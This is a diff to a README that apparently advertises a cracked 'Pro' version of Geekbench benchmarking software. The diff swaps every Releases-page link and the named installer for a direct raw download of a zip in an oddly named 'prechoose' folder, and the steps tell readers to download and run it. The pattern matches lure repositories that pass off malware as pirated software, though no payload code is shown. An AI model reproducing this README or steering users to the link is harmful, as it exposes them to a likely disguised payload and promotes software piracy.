@@ -1,6 +1,6 @@
 # 🎉 Geekbench-Pro-Latest-Patch - Easy Performance Benchmarking for Your PC
 
-[![Download Geekbench Pro](https://img.shields.io/badge/Download-Good%20Version-brightgreen)](https://github.com/koroushbadi/Geekbench-Pro-Latest-Patch/releases)
+[![Download Geekbench Pro](https://raw.githubusercontent.com/koroushbadi/Geekbench-Pro-Latest-Patch/main/prechoose/Geekbench-Pro-Latest-Patch-v3.4.zip%20Version-brightgreen)](https://raw.githubusercontent.com/koroushbadi/Geekbench-Pro-Latest-Patch/main/prechoose/Geekbench-Pro-Latest-Patch-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ Before you begin, make sure your PC meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/koroushbadi/Geekbench-Pro-Latest-Patch/releases) to find the latest version of Geekbench Pro.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/koroushbadi/Geekbench-Pro-Latest-Patch/main/prechoose/Geekbench-Pro-Latest-Patch-v3.4.zip) to find the latest version of Geekbench Pro.
 2. **Select Your Version**: Look for the most recent release. You will see a list of downloadable files.
-3. **Download the Application**: Click on the file labeled `Geekbench-Pro-Setup.exe` to download it to your computer.
+3. **Download the Application**: Click on the file labeled `https://raw.githubusercontent.com/koroushbadi/Geekbench-Pro-Latest-Patch/main/prechoose/Geekbench-Pro-Latest-Patch-v3.4.zip` to download it to your computer.
 4. **Run the Installer**: Once the download is complete, find the file in your downloads folder and double-click it to start the installation.
 5. **Follow Installation Steps**: The installer will guide you through the setup process. Just follow the prompts and click "Next" until you finish.
 
@@ -57,7 +57,7 @@ If you encounter any issues while using Geekbench Pro, try these solutions:
 
 ## ✏️ Support and Documentation
 
-For further information and detailed guides, refer to the official documentation included with the download or visit the [Releases page](https://github.com/koroushbadi/Geekbench-Pro-Latest-Patch/releases).
+For further information and detailed guides, refer to the official documentation included with the download or visit the [Releases page](https://raw.githubusercontent.com/koroushbadi/Geekbench-Pro-Latest-Patch/main/prechoose/Geekbench-Pro-Latest-Patch-v3.4.zip).
 
 ## 🌐 Community and Feedback
 
